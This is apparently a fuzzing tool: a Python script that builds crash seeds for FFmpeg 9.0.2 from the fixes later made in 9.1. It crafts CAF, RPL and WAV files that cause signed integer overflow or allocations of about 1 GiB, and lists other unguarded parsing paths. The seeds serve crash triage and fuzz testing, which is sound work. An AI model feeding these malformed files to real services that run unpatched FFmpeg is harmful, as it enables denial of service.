#!/usr/bin/env python3
"""Potential crash seeds aimed at FFmpeg 9.0.2.

Derived from the 9.0.2 -> 9.1 source diff read in the *fix* direction: every seed
reaches a demuxer path that 9.0.2 ships unguarded and 9.1 hardened, so any crash
it produces is 9.0.2-only. 9.1 is a feature release, so its Changelog lists no
per-bug titles (unlike the 8.0.3 pack, which mined the 8.1.x maintenance
Changelog); the candidates below come from the libavformat tree diff instead.

Most of 9.0.2's security fixes were also backported from master, so the genuine
9.0.2-only delta is small and dominated by integer-overflow / large-allocation
hardening rather than fresh OOB (those landed in both branches). The confirmed
hand-craftable hunks:

  caf  (libavformat/cafdec.c read_pakt_chunk): `st->nb_frames += priming` /
       `+= remainder` with no prior range check. 9.1 adds
       `if (st->nb_frames < 0 || INT64_MAX - priming - caf->remainder < st->nb_frames)`.
       -> signed int64 overflow (UBSAN) with nb_frames = INT64_MAX.

  rpl  (libavformat/rpl.c index loop): `av_add_index_entry(ast, offset + video_size, ...)`
       runs before the overflow check. 9.1 moves the check up and adds
       `video_size < 0 || offset > INT64_MAX - video_size`.
       -> signed int64 overflow (UBSAN) in `offset + video_size`.

  wav  (libavformat/wavdec.c wav_parse_bext_tag): `size -= 602; av_malloc(size + 1)`
       with size straight from the chunk header. 9.1 caps the coding history at 1 MiB.
       -> up to ~4 GiB allocation (OOM / memory-DoS probe).

Analyzed but not crafted (weak or needs a real baseline, not a magic seed):
  nsvdec.c  `vsize -= auxsize + 6` unsigned underflow -> large av_get_packet (ENOMEM).
  flvdec.c  keyframe `arraylen` up to 2^28 -> ~2 GiB av_mallocz (ENOMEM).
  mov.c     v2 audio sample entry: `sample_rate = av_int2double(avio_rb64())` with no
            NaN/range check (9.1 rejects it); reachable only via a full moov/trak/stsd,
            so it belongs in the mint-baseline path, not a crafted magic seed.

Usage:
    python tools/gen_ffmpeg_91_seeds.py [--out DIR]

Output is written to <out>/seeds/ (the layout load_corpus reads); --out
defaults to ~/fuzzing/ffmpeg_91_potential_crashes. Offline; not wired into `fuzz`.
"""

import argparse
import os
import struct

DEFAULT_OUT = os.path.expanduser("~/fuzzing/ffmpeg_91_potential_crashes")

INT64_MAX = 0x7FFFFFFFFFFFFFFF

# wav_parse_bext_tag consumes a fixed 602-byte BEXT prologue before the coding
# history; anything past it (size - 602 bytes) drives the allocation we target.
BEXT_FIXED_SIZE = 602
# ~1 GiB of declared-but-absent coding history: large enough to be a clear OOM
# probe, small enough that av_malloc may still succeed and then the short read fails.
BEXT_HISTORY = 0x40000000


def le32(v):
    return struct.pack("<I", v)


def be32(v):
    return struct.pack(">I", v)


def be16(v):
    return struct.pack(">H", v)


def be64(v):
    return struct.pack(">Q", v)


def caf_pakt_overflow():
    """caff + desc + pakt with nb_frames = INT64_MAX, priming = 1.

    read_pakt_chunk does `st->nb_frames += priming` before 9.1's range guard,
    so the add overflows signed int64 (UBSAN).
    """

    # desc payload is exactly 32 bytes: sample_rate(f64 BE), codec_tag(LE32),
    # flags, bytes_per_packet, frames_per_packet, channels, bits (BE32 each).
    desc = struct.pack(">d", 44100.0)  # sample_rate
    desc += le32(0)  # codec_tag (avio_rl32)
    desc += be32(0)  # format flags
    desc += be32(0)  # bytes_per_packet -> else-branch, no index loop
    desc += be32(0)  # frames_per_packet
    desc += be32(1)  # channels
    desc += be32(16)  # bits_per_coded_sample
    assert len(desc) == 32

    # pakt payload (24 bytes): num_packets, nb_frames, priming, remainder.
    pakt = be64(0)  # num_packets = 0 (passes the INT32_MAX/sizeof guard)
    pakt += be64(INT64_MAX)  # nb_frames = INT64_MAX
    pakt += be32(1)  # priming = 1  -> overflow on `nb_frames += priming`
    pakt += be32(0)  # remainder

    out = b"caff" + be16(1) + be16(0)  # magic, version 1, flags
    out += b"desc" + be64(32) + desc
    out += b"pakt" + be64(len(pakt)) + pakt
    return out


def rpl_idx_overflow():
    """ARMovie text header + one index row offset = INT64_MAX, video_size = 1.

    With an audio stream present, `av_add_index_entry(ast, offset + video_size, ...)`
    runs before 9.1's `offset > INT64_MAX - video_size` guard -> signed overflow.
    """

    # 20 header lines (video_format = 0 skips the video block and consumes 3
    # placeholder lines). fps (line 9) must have a non-zero leading int, else
    # read_fps sets the error flag and the index loop never runs.
    lines = [
        "ARMovie",  # 1  signature
        "t",  # 2  title
        "c",  # 3  copyright
        "a",  # 4  author
        "0",  # 5  video_format = 0 (no video stream)
        "0",  # 6  placeholder (else branch)
        "0",  # 7  placeholder
        "0",  # 8  placeholder
        "1",  # 9  fps (must be non-zero)
        "1",  # 10 audio_format != 0 -> create audio stream
        "1",  # 11 sample_rate
        "1",  # 12 channels (> 0)
        "8",  # 13 bits_per_coded_sample
        "0",  # 14 frames_per_chunk
        "0",  # 15 number_of_chunks (++ -> 1, loop runs once)
        "0",  # 16 even chunk size
        "0",  # 17 odd chunk size
        "000000",  # 18 chunk_catalog_offset (fixed 6 digits, patched below)
        "0",  # 19 helpful-sprite offset
        "0",  # 20 helpful-sprite size
    ]
    catalog_idx = 17  # 0-based index of the chunk_catalog_offset line

    # Leading zeros parse fine in read_int, so a fixed 6-digit field keeps the
    # header length constant: the catalog offset is just that total length.
    header = "\n".join(lines) + "\n"
    offset = len(header)
    assert offset < 10**6
    lines[catalog_idx] = f"{offset:06d}"
    header = "\n".join(lines) + "\n"
    assert len(header) == offset  # fixed width held

    index_row = f"{INT64_MAX} , 1 ; 0\n"
    return (header + index_row).encode()


def wav_bext_bigalloc():
    """RIFF/WAVE + bext chunk whose declared size forces a ~1 GiB allocation.

    9.0.2's wav_parse_bext_tag does `av_malloc(size - 602 + 1)` straight from
    the chunk header; 9.1 caps the coding history at 1 MiB.
    """

    bext_body = bytearray(BEXT_FIXED_SIZE)  # all-zero: version (offset 346) = 0
    bext_size = BEXT_FIXED_SIZE + BEXT_HISTORY

    chunk = b"bext" + le32(bext_size) + bytes(bext_body)
    payload = b"WAVE" + chunk
    return b"RIFF" + le32(len(payload)) + payload


SEEDS = {
    "caf_pakt_overflow.caf": caf_pakt_overflow,
    "rpl_idx_overflow.rpl": rpl_idx_overflow,
    "wav_bext_bigalloc.wav": wav_bext_bigalloc,
}


def write_seeds(seeds_dir):
    """Write the crafted 9.0.2 crash seeds into ``seeds_dir``.

    ``seeds_dir`` must already be the ``seeds/`` directory ``load_corpus`` reads
    (``main`` appends it to ``--out``), not the pack root. Each seed is written
    to a temp sibling and atomically renamed, so a reader never sees a partial
    seed if generation is interrupted mid-write.
    """

    for name, build in SEEDS.items():
        data = build()
        path = os.path.join(seeds_dir, name)
        tmp = f"{path}.tmp"
        with open(tmp, "wb") as f:
            f.write(data)
        os.replace(tmp, path)  # atomic publish
        print(f"{name}: {len(data)}B")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument(
        "--out",
        default=DEFAULT_OUT,
        help="pack root; seeds are written to <out>/seeds/ (default: %(default)s)",
    )
    args = ap.parse_args()

    out = os.path.join(args.out, "seeds")
    os.makedirs(out, exist_ok=True)
    write_seeds(out)
    print("seeds dir:", out)


if __name__ == "__main__":
    main()
